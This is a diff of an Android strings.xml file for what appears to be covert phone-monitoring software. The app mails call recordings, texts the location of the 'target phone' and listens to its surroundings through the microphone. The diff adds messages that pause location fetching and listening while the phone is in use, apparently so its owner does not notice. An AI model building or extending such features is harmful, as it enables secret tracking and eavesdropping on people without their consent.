@@ -45,6 +45,7 @@
     <string name="mail_body_record">Hi,this is an auto mail from %s with phone call recording attached.</string>
     
     <!-- Location -->
+    <string name="location_fail_screen_on">The target phone is now being viewed or operated, so do not get its location for safety reason. Please try again later.</string>
     <string name="location_sms">Click hyperlink to see location: http://maps.google.com/?q=%s</string>
     <string name="location_sms_latest">Latest(%s) </string>
     <string name="location_sms_gps">GPS location: http://maps.google.com/?q=%s</string>
@@ -56,7 +57,7 @@
     <!-- Environment Listening -->
     <string name="env_fail_exception">Exception occurred in the target phone, so environment listening failed.</string>
     <string name="env_fail_offhook">The target phone is now in a call, so you cannot listen to its environment.</string>
-    <string name="env_fail_screen_on">The target phone is being viewed or operated now, so you cannot listen to its environment.</string>
+    <string name="env_fail_screen_on">The target phone is now being viewed or operated, so you cannot listen to its environment for safety reason.</string>
     
     <!-- Preferences -->
     <string name="pref_title">Preferences</string>
